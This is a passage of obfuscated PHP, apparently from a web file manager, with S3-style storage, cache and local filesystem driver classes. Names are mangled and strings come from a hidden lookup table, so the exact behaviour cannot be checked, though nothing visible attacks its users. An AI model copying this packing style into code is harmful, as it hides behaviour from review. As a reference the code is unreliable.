$ıñá[252])) ? !0 : !1; } public function getContent($½­ßóµ¦) { return $this->client->getObject($this->bucket, $½­ßóµ¦); } public function setContent($Üâú½, $ÑğšË = '', $âœ¬™óº = false) { $óˆ¹Ä¦³ =& $_SERVER[ÕŸ²ó÷å]; $Üâú½ = $âœ¬™óº ? trim($Üâú½, $óˆ¹Ä¦³[8]) . $óˆ¹Ä¦³[8] : $Üâú½; $Ä•ˆÏ = get_file_mime(get_path_ext($Üâú½)); $’»ö’è¤ = $this->client->putObject($ÑğšË, $this->bucket, $Üâú½, $óˆ¹Ä¦³[239], array(), $Ä•ˆÏ); if (!$’»ö’è¤) { return !1; } if ($âœ¬™óº) { return !0; } return $’»ö’è¤ ? !0 : !1; } public function fileSubstr($Ö’ˆµ›ğ, $øÔ¿ê¸Ô, $ £‡›ö…) { $ÔÁ±ß°Õ = $øÔ¿ê¸Ô + $ £‡›ö… - 1; return $this->client->getObject($this->bucket, $Ö’ˆµ›ğ, array($_SERVER[ÕŸ²ó÷å][254] => "\x62\x79\164\145\163\x3d{$øÔ¿ê¸Ô}\55{$ÔÁ±ß°Õ}")); } public function upload($õ²÷êÀÑ, $×ÖğŞô, $©®å‘ıÕ = false, $ÄÙ¥‡É = REPEAT_REPLACE) { $ş˜ĞÚÉ =& $_SERVER[ÕŸ²ó÷å]; $´ß‡‰ô = array($ş˜ĞÚÉ[255] => @md5_file($×ÖğŞô)); $…±‡¤ª = array($ş˜ĞÚÉ[256] => get_file_mime(get_path_ext($õ²÷êÀÑ))); if (IO::size($×ÖğŞô) <= 1024 * 1024 * 200) { $íâÈÌË¿ = $this->client->putObjectFile($×ÖğŞô, $this->bucket, $õ²÷êÀÑ, $ş˜ĞÚÉ[239], $´ß‡‰ô, $…±‡¤ª); return !empty($íâÈÌË¿) ? $this->getPathOuter($õ²÷êÀÑ) : !1; } $Îé©¢¦À = $this->client->multiUploadObject($×ÖğŞô, $this->bucket, trim($õ²÷êÀÑ, $ş˜ĞÚÉ[8]), $´ß‡‰ô, $…±‡¤ª); return $Îé©¢¦À ? $this->getPathOuter($õ²÷êÀÑ) : !1; } public function download($˜÷­Š¸¶, $·¼ëıÂ™) { if (!@is_dir($this->pathFather($·¼ëıÂ™)) && !IO::mkdir($this->pathFather($·¼ëıÂ™))) { return !1; } $¢Ó‹±ò = $this->client->getObject($this->bucket, $˜÷­Š¸¶, array(), $·¼ëıÂ™); return $¢Ó‹±ò !== !1 ? $·¼ëıÂ™ : !1; } public function link($³ı»›ğî, $·æ’Œ‰¼ = array()) { $ê¾ŒÍˆê =& $_SERVER[ÕŸ²ó÷å]; if ($this->signVer == $ê¾ŒÍˆê[257]) { return $this->client->getAuthenticatedURL($this->bucket, $³ı»›ğî, 3600 * 12, $·æ’Œ‰¼); } return $this->client->getObjectUrl($this->accessKey, $this->secret, $this->bucket, trim($³ı»›ğî, $ê¾ŒÍˆê[8]), 3600 * 12, $this->region, array(), !0, $·æ’Œ‰¼); } public function fileOut($’ÆâÄèø, $…é­úàø = false, $İûì¹„Ë = false, $¥”Ú°º© = '') { $ı·³¬ =& $_SERVER[ÕŸ²ó÷å]; if ($this->isFileOutServer()) { return $this->fileOutServer($’ÆâÄèø, $…é­úàø, $İûì¹„Ë, $¥”Ú°º©); } if (!$İûì¹„Ë) { $İûì¹„Ë = $this->pathThis($’ÆâÄèø); } $ô¯±éˆæ = get_file_mime(get_path_ext($İûì¹„Ë)); if ($ô¯±éˆæ == $ı·³¬[258]) { return parent::fileOut($’ÆâÄèø, $…é­úàø, $İûì¹„Ë, $¥”Ú°º©); } $—ûŠŒ¶ = array($ı·³¬[259] => $ô¯±éˆæ); if ($…é­úàø) { $—ûŠŒ¶[$ı·³¬[260]] = $ı·³¬[261] . rawurlencode($İûì¹„Ë); } else { } $ÓŒÙ–öÑ = $this->link($’ÆâÄèø, $—ûŠŒ¶); $this->fileOutLink($ÓŒÙ–öÑ); } public function fileOutServer($ºåİÙÜ‡, $ğª“Éø« = false, $‰‹ú¶‰º = false, $¥€©ŒôÆ = '') { parent::fileOut($ºåİÙÜ‡, $ğª“Éø«, $‰‹ú¶‰º, $¥€©ŒôÆ); } public function fileOutImageServer($¯€¦–Òà, $ØÆ§ï“ = 250) { parent::fileOutImage($¯€¦–Òà, $ØÆ§ï“); } public function hashMd5($®ìÇ¼ª, $¸µä¨“Ò = '') { $İŒğø®Ğ = $this->objectMeta($®ìÇ¼ª); if (!$İŒğø®Ğ) { return !1; } $¸µä¨“Ò = $¸µä¨“Ò ? $¸µä¨“Ò : _get($İŒğø®Ğ, $_SERVER[ÕŸ²ó÷å][262]); return $¸µä¨“Ò; } public function uploadFormData($—Êå™æ“, $¡‚ÜÊå = 3600) { $ï·Úéì¡ =& $_SERVER[ÕŸ²ó÷å]; $³Çêª·° = $this->pathFather($—Êå™æ“); $ûïùë§† = $this->client->getHttpUploadPostParams($this->bucket, $³Çêª·°, $ï·Úéì¡[239], $¡‚ÜÊå); return array_merge((array) $ûïùë§†, array($ï·Úéì¡[218] => $this->getHost())); } public function multiUploadFormData($¿‘áÈ¼Ş, $¹ò©ÔÑ = 3600) { $½ˆØÄò„ =& $_SERVER[ÕŸ²ó÷å]; $¸ğÌæ» = gmdate($½ˆØÄò„[263]); $õ‡›ªÕî = array(); $ŞúıÂ»û = $this->client->getUploadId($this->bucket, $¿‘áÈ¼Ş, $õ‡›ªÕî); if (!$ŞúıÂ»û) { return !1; } return array($½ˆØÄò„[264] => $ŞúıÂ»û, $½ˆØÄò„[218] => $this->getHost() . $½ˆØÄò„[8] . $this->pathEncode($¿‘áÈ¼Ş), $½ˆØÄò„[265] => $¸ğÌæ», $½ˆØÄò„[107] => $¿‘áÈ¼Ş); } public function multiUploadAuthData($ìÏÇ¥ÆÔ, $Æô¯ñ†¨ = array()) { $¬Šäè¤€ =& $_SERVER[ÕŸ²ó÷å]; $÷›‘¶îİ = isset($Æô¯ñ†¨[$¬Šäè¤€[265]]) ? $Æô¯ñ†¨[$¬Šäè¤€[265]] : gmdate($¬Šäè¤€[263]); $òöúÆœÁ = isset($Æô¯ñ†¨[$¬Šäè¤€[179]]) ? $Æô¯ñ†¨[$¬Šäè¤€[179]] : $¬Šäè¤€[12]; $¾ˆœë­ı = $Æô¯ñ†¨[$¬Šäè¤€[107]]; unset($Æô¯ñ†¨[$¬Šäè¤€[107]]); if (isset($Æô¯ñ†¨[$¬Šäè¤€[266]])) { $Æô¯ñ†¨[$¬Šäè¤€[265]] = $÷›‘¶îİ; return $this->listUploadParts($¾ˆœë­ı, $Æô¯ñ†¨); } $Şæ€çëİ = array($¬Šäè¤€[267], $¬Šäè¤€[12], $¬Šäè¤€[133], $¬Šäè¤€[12], "\170\55\x61\155\x7a\x2d\144\141\164\145\x3a{$÷›‘¶îİ}", $¬Šäè¤€[8] . $this->bucket . $¬Šäè¤€[8] . $this->pathEncode($¾ˆœë­ı) . $òöúÆœÁ); if (strpos($òöúÆœÁ, $¬Šäè¤€[268]) === 0) { $Şæ€çëİ[0] = $¬Šäè¤€[269]; } if (isset($Æô¯ñ†¨[$¬Šäè¤€[270]]) && $Æô¯ñ†¨[$¬Šäè¤€[270]] == $¬Šäè¤€[271]) { $Şæ€çëİ[0] = $¬Šäè¤€[271]; } $Ö×Õ”Üª = implode($¬Šäè¤€[59], $Şæ€çëİ); $ÑØ©‰Æé = base64_encode(hash_hmac($¬Šäè¤€[272], $Ö×Õ”Üª, $this->secret, !0)); $Æôû§Şµ = $¬Šäè¤€[273] . $this->accessKey . $¬Šäè¤€[4] . $ÑØ©‰Æé; if (strpos($òöúÆœÁ, $¬Šäè¤€[268]) === 0) { return array($¬Šäè¤€[274] => $Æôû§Şµ, $¬Šäè¤€[265] => $÷›‘¶îİ); } return $Æôû§Şµ; } public function listUploadParts($®Ã»ÏÁ, $ò¿—Êê = array()) { $¦÷‘ŒøÙ =& $_SERVER[ÕŸ²ó÷å]; $Œûˆµ¦÷ = str_replace($¦÷‘ŒøÙ[275], $¦÷‘ŒøÙ[12], $ò¿—Êê[$¦÷‘ŒøÙ[179]]); $ˆ×ØÑ‘Ğ = $this->client->listParts($this->bucket, $®Ã»ÏÁ, $Œûˆµ¦÷); if (!$ˆ×ØÑ‘Ğ) { return !1; } unset($ò¿—Êê[$¦÷‘ŒøÙ[266]], $ò¿—Êê[$¦÷‘ŒøÙ[270]]); $ò¿—Êê[$¦÷‘ŒøÙ[107]] = $®Ã»ÏÁ; $Ÿ½³‚ª¢ = $this->multiUploadAuthData($®Ã»ÏÁ, $ò¿—Êê); if (empty($Ÿ½³‚ª¢)) { return !1; } return array($¦÷‘ŒøÙ[274] => $Ÿ½³‚ª¢, $¦÷‘ŒøÙ[265] => $ò¿—Êê[$¦÷‘ŒøÙ[265]], $¦÷‘ŒøÙ[276] => $ˆ×ØÑ‘Ğ); } public function getHost() { $™÷×Ôó =& $_SERVER[ÕŸ²ó÷å]; $®½úèÌ— = parent::getHost(); if (!isset($this->osType)) { $this->osType = $this->getType(); } if (!in_array($this->osType, array($™÷×Ôó[80], $™÷×Ôó[74], $™÷×Ôó[79], $™÷×Ôó[72]))) { return $®½úèÌ— . $™÷×Ôó[8] . $this->bucket; } $®½úèÌ— = explode($™÷×Ôó[220], $®½úèÌ—); return $®½úèÌ—[0] . $™÷×Ôó[220] . $this->bucket . $™÷×Ôó[10] . $®½úèÌ—[1]; } public function size($ğ¨§›Í¡) { $·Äö³ü = $this->objectMeta($ğ¨§›Í¡); return $·Äö³ü ? $·Äö³ü[$_SERVER[ÕŸ²ó÷å][89]] : 0; } public function info($¯’§Èîò) { if ($this->isFolder($¯’§Èîò)) { return $this->folderInfo($¯’§Èîò); } else { if ($this->isFile($¯’§Èîò)) { return $this->fileInfo($¯’§Èîò); } } return !1; } public function exist($†şòÎ–) { return $this->isFile($†şòÎ–) || $this->isFolder($†şòÎ–); } public function isFile($Ü…”Á¤ˆ) { return !$this->isFolder($Ü…”Á¤ˆ) && $this->objectMeta($Ü…”Á¤ˆ); } public function isFolder($Æ¡ÛÚ–İ) { return $this->cacheMethod($_SERVER[ÕŸ²ó÷å][189], $Æ¡ÛÚ–İ); } protected function objectMeta($ÙöÂ¶Î) { return $this->cacheMethod($_SERVER[ÕŸ²ó÷å][191], $ÙöÂ¶Î); } protected function _objectMeta($†Âùàª ) { $Ë¦ƒ§â“ =& $_SERVER[ÕŸ²ó÷å]; $†Âùàª  = rtrim($†Âùàª , $Ë¦ƒ§â“[8]); try { $àÁÓƒ‰¼ = $this->client->getObjectInfo($this->bucket, $†Âùàª ); if (!isset($àÁÓƒ‰¼[$Ë¦ƒ§â“[262]]) && isset($àÁÓƒ‰¼[$Ë¦ƒ§â“[277]])) { $àÁÓƒ‰¼[$Ë¦ƒ§â“[262]] = $àÁÓƒ‰¼[$Ë¦ƒ§â“[277]]; } } catch (Exception $»•¿Š”) { $àÁÓƒ‰¼ = !1; } if (!$àÁÓƒ‰¼) { } return $àÁÓƒ‰¼; } protected function _isFolder($•Üë‹) { $„Ã” ù =& $_SERVER[ÕŸ²ó÷å]; $•Üë‹ = rtrim($•Üë‹, $„Ã” ù[8]); if ($•Üë‹ == $„Ã” ù[12] || $•Üë‹ == $„Ã” ù[8]) { return !0; } $øúîÂœ = $this->client->getBucket($this->bucket, $•Üë‹, null, 1); if (empty($øúîÂœ[$„Ã” ù[246]])) { return !1; } $œî²Œ¡ = $øúîÂœ[$„Ã” ù[246]][0][$„Ã” ù[32]]; return stripos($œî²Œ¡, $•Üë‹ . $„Ã” ù[8]) === 0 ? !0 : !1; if (substr($œî²Œ¡, -1) == $„Ã” ù[8]) { return !0; } if (get_path_this($œî²Œ¡) == get_path_this($•Üë‹)) { return !1; } return !0; } public function listObject($°¬¿‰¹) { return $this->fileList($°¬¿‰¹, $_SERVER[ÕŸ²ó÷å][12], !0); } } goto E¢•³ÈâÈ; eÒàÎËÏô»: class Cache { protected static $handle; protected static $memoryCache; public static function init() { $½‹ø£ß» =& $_SERVER[ÕŸ²ó÷å]; if (self::$handle) { return self::$handle; } self::$memoryCache = array(); $šôÀ¿ı¡ = $GLOBALS[$½‹ø£ß»[6]][$½‹ø£ß»[434]]; $ñ‰›öò× = $šôÀ¿ı¡[$šôÀ¿ı¡[$½‹ø£ß»[910]]]; $ÇŒÀ›Ø› = $šôÀ¿ı¡[$½‹ø£ß»[911]]; switch ($šôÀ¿ı¡[$½‹ø£ß»[910]]) { case $½‹ø£ß»[21]: self::$handle = Model($½‹ø£ß»[912]); break; case $½‹ø£ß»[913]: self::$handle = new CacheRedis($ñ‰›öò×, $ÇŒÀ›Ø›); break; case $½‹ø£ß»[914]: self::$handle = new CacheMemcached($ñ‰›öò×, $ÇŒÀ›Ø›); break; case $½‹ø£ß»[240]: self::$handle = new CacheFile($ñ‰›öò×, $ÇŒÀ›Ø›); break; default: break; } return self::$handle; } public static function initReset() { self::$handle = !1; self::$memoryCache = !1; } public static function key($õ«£‹´Â) { if (is_array($õ«£‹´Â) || is_object($õ«£‹´Â)) { $õ«£‹´Â = json_encode($õ«£‹´Â); } $õ«£‹´Â = rawurlencode($õ«£‹´Â); return md5(KOD_SITE_ID . $_SERVER[ÕŸ²ó÷å][11] . $õ«£‹´Â); } public static function get($õ„’² ², $±¾ø™ä = false) { $³°ÜšŠ± = self::key($õ„’² ²); $ÛÔ¶³„— = self::init(); if ($±¾ø™ä) { return unserialize($ÛÔ¶³„—->get($³°ÜšŠ±)); } if (!isset(self::$memoryCache[$³°ÜšŠ±])) { $ö±ãïƒ = $ÛÔ¶³„—->get($³°ÜšŠ±); self::$memoryCache[$³°ÜšŠ±] = unserialize($ö±ãïƒ); } return self::$memoryCache[$³°ÜšŠ±]; } public static function set($êÏÕ«‹, $•Ú°ÔÊ, $ÓŞúå˜ç = false) { $øı£†‘ =& $_SERVER[ÕŸ²ó÷å]; $šö—Â„ = self::key($êÏÕ«‹); if (isset(self::$memoryCache[$šö—Â„]) && self::$memoryCache[$šö—Â„] === $•Ú°ÔÊ) { return !0; } if ($ÓŞúå˜ç === 0) { self::$memoryCache[$šö—Â„] = $•Ú°ÔÊ; return !0; } $µúÛ‘½ã = self::init(); $¤Ìµ®µ¥ = serialize($•Ú°ÔÊ); CacheLock::lock($êÏÕ«‹ . $øı£†‘[915]); $ãğÍ™Æ‹ = $µúÛ‘½ã->set($šö—Â„, $¤Ìµ®µ¥, $ÓŞúå˜ç); self::$memoryCache[$šö—Â„] = $•Ú°ÔÊ; CacheLock::unlock($êÏÕ«‹ . $øı£†‘[915]); return $ãğÍ™Æ‹; } public static function getCall($©˜ÂÙ£, $ÇüŞ÷ , $íŸüã¦, $’â“üÏ• = array()) { $¡ÇÖÒ—ë =& $_SERVER[ÕŸ²ó÷å]; $«áã¼¦ = self::get($©˜ÂÙ£); if ($«áã¼¦ || $«áã¼¦ === $¡ÇÖÒ—ë[12]) { return $«áã¼¦; } $«áã¼¦ = call_user_func_array($íŸüã¦, $’â“üÏ•); $«áã¼¦ = $«áã¼¦ ? $«áã¼¦ : $¡ÇÖÒ—ë[12]; self::set($©˜ÂÙ£, $«áã¼¦, $ÇüŞ÷ ); return $«áã¼¦; } public static function remove($İš¥î—ö) { $Ï–Ã¾™ğ = self::key($İš¥î—ö); unset(self::$memoryCache[$Ï–Ã¾™ğ]); self::clearTimeout(); CacheLock::lock($İš¥î—ö); $ì™¬ç§ = self::init()->remove($Ï–Ã¾™ğ); CacheLock::unlock($İš¥î—ö); return $ì™¬ç§; } public static function removeMemory($µ¸ÍÓ›Ÿ) { $¬íŠãïã = self::key($µ¸ÍÓ›Ÿ); unset(self::$memoryCache[$¬íŠãïã]); } public static function clearMemory($Æ–à•Ñí = false) { if ($Æ–à•Ñí) { $Æ–à•Ñí = self::key($Æ–à•Ñí); unset(self::$memoryCache[$Æ–à•Ñí]); return; } self::$memoryCache = null; self::$memoryCache = array(); } public static function deleteAll() { self::$memoryCache = array(); if (method_exists(self::init(), $_SERVER[ÕŸ²ó÷å][916])) { self::init()->deleteAll(); } } public static function clearTimeout() { if (method_exists(self::init(), $_SERVER[ÕŸ²ó÷å][917])) { self::init()->clearTimeout(); } } } class CacheFile { public $cachePath; public $prefix; public $cacheTime; public function __construct($ßÎ×Ç±†, $ã¶ßÅ¥) { $Ü˜©ÓÊİ =& $_SERVER[ÕŸ²ó÷å]; $this->cachePath = $ßÎ×Ç±†[$Ü˜©ÓÊİ[97]]; $this->prefix = $Ü˜©ÓÊİ[918]; $this->cacheTime = $ã¶ßÅ¥; if (!file_exists($this->cachePath)) { mkdir($this->cachePath, DEFAULT_PERRMISSIONS, !0); } } public function getFile($†ìÖ—ïâ) { $¿ñ£è¬— =& $_SERVER[ÕŸ²ó÷å]; $†ìÖ—ïâ = str_replace(array($¿ñ£è¬—[919], $¿ñ£è¬—[110], $¿ñ£è¬—[86]), $¿ñ£è¬—[920], $†ìÖ—ïâ); return $this->cachePath . $¿ñ£è¬—[921] . $†ìÖ—ïâ . $¿ñ£è¬—[922]; } public function set($°¿äŒáú, $µÛ¼Ì¯Ê, $‹éñØ¼Á = false) { $‹éñØ¼Á = $‹éñØ¼Á ? $‹éñØ¼Á : $this->cacheTime; $™ı°×ã‡ = $this->getFile($°¿äŒáú); if (file_put_contents($™ı°×ã‡, $this->prefix . $µÛ¼Ì¯Ê, LOCK_EX)) { @touch($™ı°×ã‡, intval(time() + $‹éñØ¼Á)); clearstatcache(); return !0; } @unlink($™ı°×ã‡); return !1; } public function get($œÄ¿¶) { $ã •©†š = $this->getFile($œÄ¿¶); if (file_exists($ã •©†š) && filemtime($ã •©†š) < time()) { @unlink($ã •©†š); return !1; } $è£´°‘ = @file_get_contents($ã •©†š); return substr($è£´°‘, strlen($this->prefix)); } public function remove($‘¨ñ¤Û) { $Ú¤´Üæƒ = $this->getFile($‘¨ñ¤Û); return @unlink($Ú¤´Üæƒ); } public function deleteAll() { $á·…¸«İ =& $_SERVER[ÕŸ²ó÷å]; $óüÏæÓ‚ = scandir($this->cachePath); foreach ($óüÏæÓ‚ as $ì¹Íê÷ø) { $Ú‡Ÿò£ = $this->cachePath . $ì¹Íê÷ø; if (strpos($Ú‡Ÿò£, $á·…¸«İ[922]) && strpos($Ú‡Ÿò£, $á·…¸«İ[923])) { @unlink($Ú‡Ÿò£); } } } public function clearTimeout() { $ùßÇşÏÚ =& $_SERVER[ÕŸ²ó÷å]; $šĞÏñÀç = scandir($this->cachePath); foreach ($šĞÏñÀç as $ñìĞ¡ıƒ) { $½Ù¸€œÛ = $this->cachePath . $ñìĞ¡ıƒ; if (strpos($½Ù¸€œÛ, $ùßÇşÏÚ[922]) && strpos($½Ù¸€œÛ, $ùßÇşÏÚ[923]) && filemtime($½Ù¸€œÛ) < time()) { @unlink($½Ù¸€œÛ); } } } } $_file = $_SERVER[$_SERVER[ÕŸ²ó÷å][63]]; goto f’Ş…¾šÔ¶; cİ˜éñœã: class PathDriverJOS extends PathDriverBaseS3 { public function __construct($‹ü˜“—Ê) { parent::__construct($‹ü˜“—Ê); $this->setSignVersion($_SERVER[ÕŸ²ó÷å][257]); } public function uploadLink($Ø×»­õË, $‘Äğ„…ä = 0) { $åã®óâ® =& $_SERVER[ÕŸ²ó÷å]; if ($this->isUploadServer()) { return; } $Õ©‘°†‚ = $this->getType(); if (!in_array($Õ©‘°†‚, $this->objectDriver)) { return; } if (!$this->isBucketCors()) { return; } $‰åİªò = (!$‘Äğ„…ä ? 1 : ceil($‘Äğ„…ä / pow(1024, 3))) * 3600 * 4; $  ˆ¥¿ = $this->multiUploadFormData($Ø×»­õË, $‰åİªò); if ($  ˆ¥¿) { $  ˆ¥¿[$åã®óâ®[107]] = $Ø×»­õË; $  ˆ¥¿[$åã®óâ®[108]] = $Õ©‘°†‚; } return $  ˆ¥¿; } public function fileOutImage($ÜšÇ³¬›, $şõ‹•¢À = 250) { if ($this->size($ÜšÇ³¬›) > 1024 * 1024 * 25) { return $this->fileOutImageServer($ÜšÇ³¬›, $şõ‹•¢À); } $¦âËæíÉ = $this->link($ÜšÇ³¬›); $¦âËæíÉ .= $_SERVER[ÕŸ²ó÷å][1454] . $şõ‹•¢À; $this->fileOutLink($¦âËæíÉ); } public function fileOutLink($ç¨î¦Ç) { $‹†¥Ò½“ =& $_SERVER[ÕŸ²ó÷å]; if (substr($ç¨î¦Ç, 0, 7) == $‹†¥Ò½“[322]) { $ç¨î¦Ç = $‹†¥Ò½“[323] . substr($ç¨î¦Ç, 7); } header($‹†¥Ò½“[185] . $ç¨î¦Ç); die; } } class PathDriverLocal extends PathDriverBase { private $pathAuth; public function __construct() { parent::__construct(); $this->pathAuth = DEFAULT_PERRMISSIONS; } public function getPath($ÊçÑİÎ) { if (substr($ÊçÑİÎ, 0, 2) == $_SERVER[ÕŸ²ó÷å][1413]) { $ÊçÑİÎ = BASIC_PATH . substr($ÊçÑİÎ, 2); } return $ÊçÑİÎ; } public function iconvApp($ÃÄÕìØ) { $ò¯âˆÚ¦ =& $_SERVER[ÕŸ²ó÷å]; global $config; return $this->iconvTo($ÃÄÕìØ, $config[$ò¯âˆÚ¦[1440]], $config[$ò¯âˆÚ¦[1439]]); } public function iconvSystem($¬«Æƒ«à) { $ú’»œè¯ =& $_SERVER[ÕŸ²ó÷å]; global $config; return $this->iconvTo($¬«Æƒ«à, $config[$ú’»œè¯[1439]], $config[$ú’»œè¯[1440]]); } public function getPathOuter($ĞÈÌİ›ˆ) { $É²¿Õà =& $_SERVER[ÕŸ²ó÷å]; $¢ı¶§Íó = $this->iconvApp($this->pathBase); $ĞÈÌİ›ˆ = $this->iconvApp($ĞÈÌİ›ˆ); if (substr($¢ı¶§Íó, 0, 2) == $É²¿Õà[1413]) { $¢ı¶§Íó = BASIC_PATH . substr($¢ı¶§Íó, 2); } if (substr($ĞÈÌİ›ˆ, 0, 2) == $É²¿Õà[1413]) { $ĞÈÌİ›ˆ = BASIC_PATH . substr($ĞÈÌİ›ˆ, 2); } $¢ı¶§Íó = KodIO::clear($¢ı¶§Íó); $ĞÈÌİ›ˆ = KodIO::clear($ĞÈÌİ›ˆ); $ĞÈÌİ›ˆ = substr($ĞÈÌİ›ˆ, strlen($¢ı¶§Íó)); if (empty($this->pathDriver)) { return $ĞÈÌİ›ˆ; } return $this->pathDriver . $É²¿Õà[8] . ltrim($ĞÈÌİ›ˆ, $É²¿Õà[8]); } public function mkfile($Ò³¼ÒÅğ, $ğóêø’ = '', $éÉï­×½ = REPEAT_RENAME) { $Ò³¼ÒÅğ = $this->iconvSystem($Ò³¼ÒÅğ); @touch($Ò³¼ÒÅğ); if ($ğóêø’) { file_put_contents($Ò³¼ÒÅğ, $ğóêø’); } @chmod($Ò³¼ÒÅğ, $this->pathAuth); if (is_file($Ò³¼ÒÅğ)) { return $this->getPathOuter($Ò³¼ÒÅğ); } $this->writeLog(__FUNCTION__ . $_SERVER[ÕŸ²ó÷å][1451], !0); return !1; } public function mkdir($ÊÊêº³ˆ, $©¸ìü¡¾ = REPEAT_SKIP) { $ÊÊêº³ˆ = $this->iconvSystem($ÊÊêº³ˆ); if (is_dir($ÊÊêº³ˆ)) { return $this->getPathOuter($ÊÊêº³ˆ); } @mkdir($ÊÊêº³ˆ, $this->pathAuth, !0); @chmod($ÊÊêº³ˆ, $this->pathAuth); if (is_dir($ÊÊêº³ˆ)) { return $this->getPathOuter($ÊÊêº³ˆ); } $this->writeLog(__FUNCTION__ . $_SERVER[ÕŸ²ó÷å][1451], !0); return !1; } public function copyFile($¸ƒ­ü¼, $¿å¯ÚíÙ) { $this->mkdir($this->pathFather($¿å¯ÚíÙ)); $¸ƒ­ü¼ = $this->iconvSystem($¸ƒ­ü¼); $¿å¯ÚíÙ = $this->iconvSystem($¿å¯ÚíÙ); $Ôœ‡« = copy_64($¸ƒ­ü¼, $¿å¯ÚíÙ); @chmod($¿å¯ÚíÙ, $this->pathAuth); if ($Ôœ‡«) { return $this->getPathOuter($¿å¯ÚíÙ); } $this->writeLog(__FUNCTION__ . $_SERVER[ÕŸ²ó÷å][1451], !0); return !1; } public function moveFile($·§ëğé‘, $®­Ø ) { $this->mkdir($this->pathFather($®­Ø )); $·§ëğé‘ = $this->iconvSystem($·§ëğé‘); $®­Ø  = $this->iconvSystem($®­Ø ); $áè˜Ÿš = intval(@rename($·§ëğé‘, $®­Ø )); if (!$áè˜Ÿš) { if ($áè˜Ÿš = intval(@copy_64($·§ëğé‘, $®­Ø ))) { @unlink($·§ëğé‘); } } @chmod($®­Ø , $this->pathAuth); if ($áè˜Ÿš) { return $this->getPathOuter($®­Ø ); } $this->writeLog(__FUNCTION__ . $_SERVER[ÕŸ²ó÷å][1451], !0); return !1; } public function movePath($£óâ¡ùî, $ùº÷¦¬¢, $·Æªº€ = false) { $½¯œä±û =& $_SERVER[ÕŸ²ó÷å]; $£óâ¡ùî = $this->iconvSystem($£óâ¡ùî); $ùº÷¦¬¢ = $this->iconvSystem($ùº÷¦¬¢); $ÆçÕÈè€ = rtrim($ùº÷¦¬¢, $½¯œä±û[8]) . $½¯œä±û[8] . ($·Æªº€ ? $·Æªº€ : get_path_this($£óâ¡ùî)); if (file_exists($ÆçÕÈè€)) { return !1; } $îĞï‹Å = intval(@rename($£óâ¡ùî, $ÆçÕÈè€)); $îĞï‹Å = file_exists($ÆçÕÈè€); if ($îĞï‹Å) { return $this->getPathOuter($ÆçÕÈè€); } $this->writeLog(__FUNCTION__ . $½¯œä±û[1451], !0); return !1; } public function delFile($†££Ë÷Ì) { $†££Ë÷Ì = $this->iconvSystem($†££Ë÷Ì); if (!@unlink($†££Ë÷Ì)) { @chmod($†££Ë÷Ì, $this->pathAuth); if (@unlink($†££Ë÷Ì)) { return !0; } $this->writeLog(__FUNCTION__ . $_SERVER[ÕŸ²ó÷å][1451], !0); return !1; } return !0; } public function delFolder($ıÃ§û“) { $—‹Ãğ„É =& $_SERVER[ÕŸ²ó÷å]; $ıÃ§û“ = $this->iconvSystem($ıÃ§û“); if (!is_dir($ıÃ§û“)) { return !0; } if (!($£Ù‹…± = opendir($ıÃ§û“))) { return !1; } while (($šçİş¹ = readdir($£Ù‹…±)) !== !1) { if ($šçİş¹ == $—‹Ãğ„É[10] || $šçİş¹ == $—‹Ãğ„É[1366]) { continue; } $Ö™†ÛÒ = $ıÃ§û“ . $—‹Ãğ„É[8] . $šçİş¹; if (is_file($Ö™†ÛÒ) || is_link($Ö™†ÛÒ)) { if (!unlink($Ö™†ÛÒ)) { chmod($Ö™†ÛÒ, $this->pathAuth); if (!unlink($Ö™†ÛÒ)) { return !1; } } } else { if (is_dir($Ö™†ÛÒ)) { chmod($Ö™†ÛÒ, $this->pathAuth); $Ö™†ÛÒ = $this->iconvApp($Ö™†ÛÒ); if (!$this->delFolder($Ö™†ÛÒ)) { return !1; } } } } closedir($£Ù‹…±); return rmdir($ıÃ§û“); } public function rename($ŒÚŠ„Ú, $ÎåÆÂáó) { $¼ÒÕĞîğ =& $_SERVER[ÕŸ²ó÷å]; $¡ú¶¬ä¥ = $this->fileNameAuto($this->pathFather($ŒÚŠ„Ú), $ÎåÆÂáó); $¡ú¶¬ä¥ = $this->iconvSystem($¡ú¶¬ä¥); $ŒÚŠ„Ú = $this->iconvSystem($ŒÚŠ„Ú); $ç’çÔ¬ = $this->pathFather($ŒÚŠ„Ú); $ô¤¢à× = rtrim($ç’çÔ¬, $¼ÒÕĞîğ[8]) . $¼ÒÕĞîğ[8] . $¡ú¶¬ä¥; $ûªÑãÎ = @rename($ŒÚŠ„Ú, $ô¤¢à×); $ô¤¢à× = $this->iconvApp($ô¤¢à×); if ($ûªÑãÎ) { return $this->getPathOuter($ô¤¢à×); } $this->writeLog(__FUNCTION__ . $¼ÒÕĞîğ[1451], !0); return !1; } public function size($³çá¼±œ) { $³çá¼±œ = $this->iconvSystem($³çá¼±œ); return filesize_64($³çá¼±œ); } public function info($¹Åƒ„) { $¹Åƒ„ = $this->iconvSystem($¹Åƒ„); if ($this->isFolder($¹Åƒ„)) { return $this->folderInfo($¹Åƒ„); } else { if ($this->isFile($¹Åƒ„)) { return $this->fileInfo($¹Åƒ„); } } return !1; } protected function infoChildren($ä÷£¨º¸, &$¸óö½Ş, $ì»ßÇéÁ = true) { $ªíÅÅ¼Ø =& $_SERVER[ÕŸ²ó÷å]; check_abort_echo(); $ä÷£¨º¸ = rtrim($ä÷£¨º¸, $ªíÅÅ¼Ø[8]) . $ªíÅÅ¼Ø[8]; if ($ì»ßÇéÁ) { $ä÷£¨º¸ = $this->iconvSystem($ä÷£¨º¸); } if (!($ƒ›÷‰¤Ğ = @opendir($ä÷£¨º¸))) { return; } while (($Ë¨ùÈ˜³ = readdir($ƒ›÷‰¤Ğ)) !== !1) { if ($Ë¨ùÈ˜³ == $ªíÅÅ¼Ø[10] || $Ë¨ùÈ˜³ == $ªíÅÅ¼Ø[1366]) { continue; } $ÁÎ‘á—ø = $ä÷£¨º¸ . $Ë¨ùÈ˜³; if (is_file($ÁÎ‘á—ø) || is_link($ÁÎ‘á—ø)) { $¸óö½Ş[$ªíÅÅ¼Ø[90]]++; $¸óö½Ş[$ªíÅÅ¼Ø[89]] += filesize_64($ÁÎ‘á—ø); } else { if (is_dir($ÁÎ‘á—ø)) { $¸óö½Ş[$ªíÅÅ¼Ø[91]]++; $this->infoChildren($ÁÎ‘á—ø, $¸óö½Ş, !1); } } } closedir($ƒ›÷‰¤Ğ); } private function folderInfo($Ãë»”×­, $ƒ‘ØÅ±” = false) { $İÇ¼öôœ =& $_SERVER[ÕŸ²ó÷å]; $Ãë»”×­ = rtrim($Ãë»”×­, $İÇ¼öôœ[8]) . $İÇ¼öôœ[8]; $÷üÛí¸Ò = 